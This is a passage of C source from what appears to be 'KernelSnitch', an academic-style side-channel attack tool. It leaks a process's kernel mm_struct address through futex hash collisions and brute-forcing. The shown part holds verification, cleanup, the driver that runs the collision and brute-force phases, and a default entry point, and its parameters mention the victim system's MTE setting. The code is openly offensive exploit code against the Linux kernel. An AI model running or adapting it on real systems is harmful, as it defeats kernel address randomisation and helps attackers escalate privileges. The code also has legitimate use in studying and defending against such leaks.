                       confirmation_mm);
            if (confirmation_mm != resolved_mm)
                goto reject_mm;
        }
    } else {
        pr_warning("DBG mm disjoint confirmation unavailable pool=%zu collisions=%zu primary_batch=%zu\n",
                   pool, ks->collisions, resolved_batch);
    }

    __ks_restore_mm_result(ks, resolved_mm, resolved_batch);
    ks->state = KERNELSNITCH_MM_FOUND;
    return;

reject_mm:
    pr_warning("DBG mm rejected workers_ok=%d resolved=%016zx\n",
               !worker_failure, resolved_mm);
    __ks_reset_mm_result(ks);
    ks->state = KERNELSNITCH_MM_NOT_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
    ks->times = 0;
    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
    ks->tids = 0;
    munmap((void *)ks->futex_addrs, sizeof(size_t)*64);
    ks->futex_addrs = 0;
    munmap((void *)ks->futexes, FUTEX_SZ);
    ks->futexes = 0;
    size_t ret = ks->mm_struct;
    if (ks->verbose) pr_info("done\n");
    munmap(ks, sizeof(struct kernelsnitch_shared_state));
    return ret;
}

/**
 * Performs KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose, __mte_enabled);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_find_collisions(ks);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_bruteforce(ks);
    if (ks->verbose) pr_info("===============================================\n");
    return kernelsnitch_cleanup(ks);
}

/**
 * Prints the current execution state KernelSnitch is in
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
{
    pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
}

/**
 * Prints the found collisions
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
{
    pr_info("collisions:\n");
    for (size_t i = 2; i < ks->collisions; ++i) {
        size_t addr = ks->futex_addrs[i];
        pr_info("  %016zx\n", addr);
    }
}

/**
 * KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @return: the found mm_struct address
 */
size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
{
    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0, 0);
}
